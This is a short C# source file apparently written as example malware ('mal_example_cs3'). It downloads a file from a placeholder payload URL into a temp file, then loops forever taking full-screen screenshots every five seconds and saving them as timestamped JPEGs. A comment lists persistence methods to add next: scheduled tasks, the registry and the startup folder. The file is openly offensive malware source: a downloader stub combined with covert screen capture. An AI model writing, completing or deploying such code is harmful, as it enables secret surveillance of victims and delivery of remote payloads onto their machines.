using System;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Drawing;
using System.Globalization;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace mal_example_cs3
{
    class Program
    {
        static void Main(string[] _)
        {
            string fileName = Path.GetTempFileName();
            FileInfo fileInfo = new FileInfo(fileName)
            {
                Attributes = FileAttributes.Temporary
            };
            // dl payload
            WebClient webClient = new WebClient();
            string url = "http://<payload url>";
            webClient.DownloadFile(url, @fileName);
            // execute payload

            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            Graphics graphics = Graphics.FromImage(bitmap);

            while (true)
            {
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                //string screenName = string.Empty;
                string screenName = Path.GetTempFileName();
                bitmap.Save(screenName, System.Drawing.Imaging.ImageFormat.Jpeg);
                string outPath = Path.GetDirectoryName(screenName);
                DateTime utcDate = DateTime.UtcNow;
                string newFile = utcDate.ToString("s", DateTimeFormatInfo.InvariantInfo);
                newFile = newFile.Replace(':', '_');
                newFile += ".jpeg";
                //string newFile = "screenshot.jpeg";
                string newName = Path.Combine(outPath, newFile);
                File.Move(screenName, newName);
                Thread.Sleep(5000);
            }
            //next would be persistence for this, scheduled tasks, at, registry, startup folder
        }

       
    }
}